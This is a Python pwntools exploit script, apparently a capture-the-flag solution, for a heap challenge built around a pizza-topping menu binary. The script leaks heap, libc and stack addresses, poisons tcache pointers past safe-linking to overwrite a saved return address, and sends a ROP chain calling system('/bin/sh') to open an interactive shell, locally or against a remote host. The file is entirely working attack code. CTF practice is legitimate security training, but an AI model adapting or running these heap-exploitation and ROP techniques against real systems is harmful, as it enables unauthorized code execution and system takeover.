#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from os import path
import sys

# ==========================[ Information
DIR = path.dirname(path.abspath(__file__))
EXECUTABLE = "/chal"
TARGET = DIR + EXECUTABLE 
HOST, PORT = "34.70.212.151", 8007
REMOTE, LOCAL = False, False

# ==========================[ Tools
elf = ELF(TARGET)
elfROP = ROP(elf)

# ==========================[ Configuration
context.update(
    arch=["i386", "amd64", "aarch64"][1],
    endian="little",
    os="linux",
    log_level = ['debug', 'info', 'warn'][2],
    terminal = ['tmux', 'split-window', '-h'],
)

# ==========================[ Exploit

get_idx = {0:b"Tomato", 1:b"Onion", 2:b"Capsicum", 3:b"Corn", 4:b"Mushroom", 5:b"Pineapple", 6:b"Olives", 7:b"Double Cheese", 8:b"Paneer", 9:b"Chicken", }

def add(idx, sz=0x20):
    io.sendlineafter(b": ", b"1")
    io.sendlineafter(b"?\n", get_idx[idx])
    io.sendlineafter(b"?\n", str(sz).encode())
    print("ADDED")

def edit(idx, data):
    io.sendlineafter(b": ", b"2")
    io.sendlineafter(b"?\n", get_idx[idx])
    io.sendafter(b": ", data)
    print("EDITED")

def delete(idx):
    io.sendlineafter(b": ", b"3")
    io.sendlineafter(b"?\n", get_idx[idx])
    print("DELETED", idx)

def verify(idx):
    io.sendlineafter(b": ", b"4")
    io.sendlineafter(b"?\n", get_idx[idx])
    resp = io.recvuntil(b"\n\nChoose", drop=True)
    return resp

def exploit(io, libc=null):
    if LOCAL==True:
        #raw_input("Fire GDB!")
        if len(sys.argv) > 1 and sys.argv[1] == "d":
            choosen_gdb = [
                "source /home/mydata/tools/gdb/gdb-pwndbg/gdbinit.py",     # 0 - pwndbg
                "source /home/mydata/tools/gdb/gdb-peda/peda.py",          # 1 - peda
                "source /home/mydata/tools/gdb/gdb-gef/.gdbinit-gef.py"    # 2 - gef
                ][0]
            cmd = choosen_gdb + """
            b *customize_topping+0x118
            # b *verify_topping+0x9f
            """
            gdb.attach(io, gdbscript=cmd)
    
    for i in range(7+2):
        add(i, 0x30)

    for i in range(7):
        delete(i)
    delete(7)
    delete(8)

    LEAKED_HEAP = u64(verify(0).ljust(8, b"\x00"))
    HEAP_BASE = LEAKED_HEAP << 12
    HEAP_CHUNK0 = HEAP_BASE + 0x2a0
    HEAP_CHUNK7 = HEAP_BASE + 0x1090
    HEAP_CHUNK8 = HEAP_CHUNK7
    print("LEAKED_HEAP              :", hex(LEAKED_HEAP))
    print("HEAP_BASE                :", hex(HEAP_BASE))
    print("HEAP_CHUNK0              :", hex(HEAP_CHUNK0))
    print("HEAP_CHUNK7              :", hex(HEAP_CHUNK7))
    LEAKED_LIBC = u64(verify(7).ljust(8, b"\x00"))
    libc.address = LEAKED_LIBC - 0x219ce0
    print("LEAKED_LIBC              :", hex(LEAKED_LIBC))
    print("libc.address             :", hex(libc.address))

    for i in range(7+2):
        add(i, 0x0d)

    for i in range(7):
        delete(i)
    delete(8)
    delete(7)
    delete(8)
    delete(7)


    for i in range(7):
        add(i, 0x0d)
    add(8, 0x0d)

    p = b""
    p += p64(((HEAP_CHUNK8)>>12)^(libc.symbols["environ"]))
    edit(8, p)

    add(9, 0x0d)
    add(9, 0x0d)
    add(9, 0x0d)
    
    # ============================================

    LEAKED_STACK = u64(verify(9).ljust(8, b"\x00"))
    SAVED_RIP_MAIN = (LEAKED_STACK - 0x220) & ~0xF
    CHUNK_LIST = LEAKED_STACK - 0x1d8
    print("LEAKED_STACK                 :", hex(LEAKED_STACK))
    print("SAVED_RIP_MAIN               :", hex(SAVED_RIP_MAIN))


    for i in range(7+2):
        add(i, 0x09)

    for i in range(7):
        delete(i)
    delete(8)
    delete(7)
    delete(8)
    delete(7)
    delete(8)


    for i in range(7):
        add(i, 0x09)
    add(8, 0x09)

    HEAP_CHUNK8 = HEAP_BASE + 0x1420
    p = b""
    p += p64(((HEAP_CHUNK8)>>12)^(CHUNK_LIST))
    p += p64(0)
    p += p64(0)
    edit(8, p)

    add(9, 0x09)
    add(9, 0x09)
    add(9, 0x09)

    p = b""
    p += p64(SAVED_RIP_MAIN)
    edit(9, p)

    p = b""
    p += p64(libc.search(asm("pop rdi; ret")).__next__()+1)*4
    p += p64(libc.search(asm("pop rdi; ret")).__next__())
    p += p64(libc.search(b"/bin/sh").__next__())
    p += p64(libc.symbols["system"])
    edit(0, p)
    

    io.interactive()

if __name__ == "__main__":
    io, libc = null, null

    if args.REMOTE:
        REMOTE = True
        io = remote(HOST, PORT)
        # libc = ELF("___")
        
    else:
        LOCAL = True
        io = process(
            [TARGET, ],
            env={
            #     "LD_PRELOAD":DIR+"/___",
            #     "LD_LIBRARY_PATH":DIR+"/___",
            },
        )
    libc = ELF("libc.so.6")
    exploit(io, libc)
